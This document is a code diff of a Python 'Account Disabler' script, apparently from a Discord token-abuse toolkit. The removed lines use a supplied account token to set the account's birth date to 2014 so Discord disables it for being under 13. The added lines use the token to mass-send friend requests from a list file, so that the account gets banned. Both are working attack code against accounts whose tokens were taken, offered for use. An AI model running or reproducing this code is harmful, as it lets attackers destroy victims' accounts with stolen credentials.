@@ -1,22 +1,28 @@
 import requests
-import Xvirus
+import os
+from util.plugins.common import * 
 
-from colorama import Fore
+setTitle("Account Disabler")
+clear()
 
-from util.plugins.common import getheaders, proxy
-
-def TokenDisable(token):
+def TokenDisable():
     #change their age to below 13 years old which is against tos which disables their account
-    res = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={'date_of_birth': '2014-2-11'})
+    print(f"""Enter account token to disable""")
+    token = str(input(f"""Token: """))
+    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
+    print(f"\nUser Details: {res['username']}#{res['discriminator']} - ({res['id']})")
+    input(f"If These Details Are Correct Press Enter! (This Will Start Disbaling The Account, Use At Own Risk!)")
+    print()
+    for username in open('assets/users.txt', 'r').read().splitlines():
+        try:
+            usr = username.split('#')
+            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
+            print(f"\t{usr[0]}#{usr[1]} Added!")
+        except:
+            print(f"Something Went Wrong!")
+    print(f"\n\nAccount successfully disabled")
+    input(f"""\nPress enter to exit""")
+    main()
 
-    if res.status_code == 400:
-        res_message = res.json().get('date_of_birth', ['no response message'])[0]
-        
-        if res_message == "You need to be 13 or older in order to use Discord.":
-            print(f'\n{Fore.RED}Token successfully disabled!{Fore.RESET}\n')
-        elif res_message == "You cannot update your date of birth.":
-            print('Account can\'t be disabled')
-    else:
-        print('Failed to disable account')
-    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
-    Xvirus.main()
+TokenDisable()
